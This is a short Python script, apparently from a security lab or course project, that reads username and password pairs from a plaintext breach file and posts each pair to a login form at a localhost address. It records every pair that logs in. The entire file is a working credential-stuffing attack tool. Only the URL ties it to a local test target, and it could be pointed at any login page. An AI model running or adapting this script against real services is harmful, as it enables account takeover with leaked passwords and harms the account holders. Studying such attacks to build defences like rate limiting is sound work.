from csv import reader
from requests import post, codes

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    success_creds = []
    for cred_pair in creds:
        if len(cred_pair) != 2:
            continue
        uname = cred_pair[0]
        pswd = cred_pair[1]
        login_succ = attempt_login(uname, pswd)
        if login_succ:
            success_creds.append(cred_pair)
    return success_creds

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    creds = credential_stuffing_attack(creds)
    print(creds)

if __name__ == "__main__":
    main()
